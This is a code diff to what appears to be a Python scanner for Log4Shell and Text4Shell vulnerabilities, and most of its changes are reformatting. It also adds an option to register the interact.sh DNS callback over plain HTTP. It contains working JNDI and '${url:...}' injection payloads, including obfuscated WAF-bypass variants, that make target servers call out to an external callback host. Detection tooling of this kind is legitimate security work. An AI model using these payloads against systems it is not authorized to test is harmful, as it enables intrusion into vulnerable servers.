@@ -47,7 +47,8 @@ default_headers = {
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 
-post_data_parameters = ["username", "user", "uname", "name", "email", "email_address", "password"]
+post_data_parameters = ["username", "user", "uname",
+                        "name", "email", "email_address", "password"]
 timeout = 4
 
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
@@ -76,10 +77,11 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        ]
 
 cve_2021_45046 = [
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",  # Source: https://twitter.com/marcioalm/status/1471740771581652995,
-                  "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
-                  "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
-                 ]
+    # Source: https://twitter.com/marcioalm/status/1471740771581652995,
+    "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",
+    "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
+    "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
+]
 
 cve_2022_42889 =  [
                   "${url:UTF-8::https://{{callback_host}}/}",
@@ -150,6 +152,10 @@ parser.add_argument("--custom-dns-callback-host",
                     dest="custom_dns_callback_host",
                     help="Custom DNS Callback Host.",
                     action='store')
+parser.add_argument("--disable-tls-to-register-dns",
+                    dest="disable_tls_to_register_dns",
+                    help="Disable TLS (https) when registering the DNS host.",
+                    action='store_true')
 parser.add_argument("--disable-http-redirects",
                     dest="disable_redirects",
                     help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have a higher chance of reaching vulnerable systems.",
@@ -249,7 +255,8 @@ class Interactsh:
         self.secret = str(uuid4())
         self.encoded = b64encode(self.public_key).decode("utf8")
         guid = uuid4().hex.ljust(33, 'a')
-        guid = ''.join(i if i.isdigit() else chr(ord(i) + random.randint(0, 20)) for i in guid)
+        guid = ''.join(i if i.isdigit() else chr(
+            ord(i) + random.randint(0, 20)) for i in guid)
         self.domain = f'{guid}.{self.server}'
         self.correlation_id = self.domain[:20]
 
@@ -265,16 +272,20 @@ class Interactsh:
             "secret-key": self.secret,
             "correlation-id": self.correlation_id
         }
+        protocol = 'http' if args.disable_tls_to_register_dns else 'https'
         res = self.session.post(
-            f"https://{self.server}/register", headers=self.headers, json=data, timeout=30)
+            f"{protocol}://{self.server}/register", headers=self.headers, json=data, timeout=30)
         if 'success' not in res.text:
             raise Exception("Can not initiate interact.sh DNS callback client")
 
     def pull_logs(self):
         result = []
-        url = f"https://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
+        protocol = 'http' if args.disable_tls_to_register_dns else 'https'
+        url = f"{protocol}://{self.server}/poll?id={self.correlation_id}&secret={self.secret}"
         res = self.session.get(url, headers=self.headers, timeout=30).json()
         aes_key, data_list = res['aes_key'], res['data']
+        if data_list is None:
+            data_list = []
         for i in data_list:
             decrypt_data = self.__decrypt_data(aes_key, i)
             result.append(self.__parse_log(decrypt_data))
@@ -287,7 +298,8 @@ class Interactsh:
         decode = base64.b64decode(data)
         bs = AES.block_size
         iv = decode[:bs]
-        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB, IV=iv, segment_size=128)
+        cryptor = AES.new(key=aes_plain_key, mode=AES.MODE_CFB,
+                          IV=iv, segment_size=128)
         plain_text = cryptor.decrypt(decode)
         return json.loads(plain_text[16:])
 
@@ -317,19 +329,22 @@ def parse_url(url):
     if (file_path == ''):
         file_path = '/'
 
-    return({"scheme": scheme,
+    return ({"scheme": scheme,
             "site": f"{scheme}://{urlparse.urlparse(url).netloc}",
-            "host":  urlparse.urlparse(url).netloc.split(":")[0],
-            "file_path": file_path})
+             "host":  urlparse.urlparse(url).netloc.split(":")[0],
+             "file_path": file_path})
 
 
 def scan_url(url, callback_host):
     parsed_url = parse_url(url)
-    random_string = ''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
-    payload = '${jndi:ldap://%s.%s/%s}' % (parsed_url["host"], callback_host, random_string)
+    random_string = ''.join(random.choice(
+        '0123456789abcdefghijklmnopqrstuvwxyz') for i in range(7))
+    payload = '${jndi:ldap://%s.%s/%s}' % (
+        parsed_url["host"], callback_host, random_string)
     payloads = [payload]
     if args.waf_bypass_payloads:
-        payloads.extend(generate_waf_bypass_payloads(f'{parsed_url["host"]}.{callback_host}', random_string))
+        payloads.extend(generate_waf_bypass_payloads(
+            f'{parsed_url["host"]}.{callback_host}', random_string))
 
     if args.cve_2021_45046:
         cprint(f"[•] Scanning for CVE-2021-45046 (Log4j v2.15.0 Patch Bypass - RCE)", "yellow")
@@ -399,10 +414,12 @@ def main():
 
     dns_callback_host = ""
     if args.custom_dns_callback_host:
-        cprint(f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
+        cprint(
+            f"[•] Using custom DNS Callback host [{args.custom_dns_callback_host}]. No verification will be done after sending fuzz requests.")
         dns_callback_host = args.custom_dns_callback_host
     else:
-        cprint(f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
+        cprint(
+            f"[•] Initiating DNS callback server ({args.dns_callback_provider}).")
         if args.dns_callback_provider == "interact.sh":
             dns_callback = Interactsh()
         elif args.dns_callback_provider == "dnslog.cn":
